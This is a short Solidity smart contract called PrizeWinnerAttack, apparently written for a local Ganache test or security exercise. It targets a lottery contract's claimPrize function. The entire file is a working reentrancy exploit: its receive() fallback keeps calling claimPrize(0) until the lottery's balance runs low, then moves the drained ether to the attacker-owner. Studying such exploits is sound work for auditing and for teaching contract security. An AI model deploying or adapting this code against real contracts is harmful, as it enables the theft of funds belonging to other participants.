// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@ganache/console.log/console.sol";


interface ILottery3 {
    function bet() external payable;
    function claimPrize(uint _week) external;
}

contract PrizeWinnerAttack {
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can perform this action");
        _;
    }
  address owner;
  ILottery3 public immutable lotteryContract;

  constructor(address _lotteryContractAddress) {
    lotteryContract = ILottery3(_lotteryContractAddress);
    owner = msg.sender;
  }

  function bet() external payable onlyOwner {
    lotteryContract.bet{value:msg.value}();
  }

  function attack() external payable onlyOwner {
    console.log("Before the first call of claimPrize"); // Triggered 
    lotteryContract.claimPrize(0);
    console.log("After the first call of claimPrize ");
  }

  receive() external payable {
    if (address(lotteryContract).balance >= msg.value) {
      console.log("Before another call of claimPrize ");
      lotteryContract.claimPrize(0);
      console.log("After another call of claimPrize ");      
    } else {
      console.log("Before transfering ether");
      payable(owner).transfer(address(this).balance);
      console.log("After transfering ether"); 
    }
  }
}




